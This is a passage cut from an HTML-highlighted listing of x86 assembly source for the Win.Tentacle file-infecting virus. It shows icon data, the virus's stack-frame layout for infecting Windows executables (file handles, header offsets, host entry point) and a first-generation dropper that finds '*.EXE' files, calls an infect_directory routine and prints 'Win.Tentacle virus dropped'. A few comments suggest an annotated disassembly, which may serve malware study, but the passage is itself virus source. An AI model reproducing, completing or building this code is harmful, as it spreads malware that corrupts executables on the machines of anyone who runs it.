    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">071h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0D8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ADh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ACh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">088h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B9h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0DBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ABh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">088h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DCh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">
</span><span class="sc5">icon_size</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">icon</span><span class="sc4">)</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">; maybe the author wanted org_entry</span><span class="sc0">
                    </span><span class="sc1">; to be on a even address?</span><span class="sc0">

</span><span class="sc5">org_entry</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0000FFFFh</span><span class="sc0">

</span><span class="sc5">virus_end</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc1">; Most data of the virus is stored in a buffer on the stack. The following</span><span class="sc0">
</span><span class="sc1">; structure represents the lay-out of this stack frame:</span><span class="sc0">

</span><span class="sc5">stack_frame</span><span class="sc0">     </span><span class="sc9">struc</span><span class="sc0">
</span><span class="sc5">dta</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2Bh</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">resource_stuff1</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">resource_stuff2</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">bytes_to_copy</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">filename_ptr</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">full_filename</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">source_handle</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dest_handle</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">file_date</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">file_time</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">file_size</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">new_header_offs</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">offs_other_tbls</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">alignment_unit</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">first_segm_offs</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">new_sect_descr</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">host_entry_cs</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">host_entry_ip</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">rw_buffer</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">64</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">stack_frame</span><span class="sc0">     </span><span class="sc9">ends</span><span class="sc0">


</span><span class="sc5">first_gen_entry</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">stack_frame</span><span class="sc0">     </span><span class="sc1">; reserve room on stack</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                   </span><span class="sc1">; setup stack frame</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">                  </span><span class="sc1">; set DTA to DS:DX</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">bp.dta</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Load effective addr</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">                      </span><span class="sc1">; DS=SS</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                      </span><span class="sc1">; DS=CS</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filespec</span><span class="sc0">      </span><span class="sc1">; DX=ptr to "*.EXE"</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">               </span><span class="sc1">; get all files in current directory</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_directory</span><span class="sc0">        </span><span class="sc1">; search &amp; infect!</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">first_gen_message</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4C00h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">first_gen_message</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Win.Tentacle virus dropped"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"$"</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">first_gen_entry</span><span class="sc0">
</span></div></body>
</html>
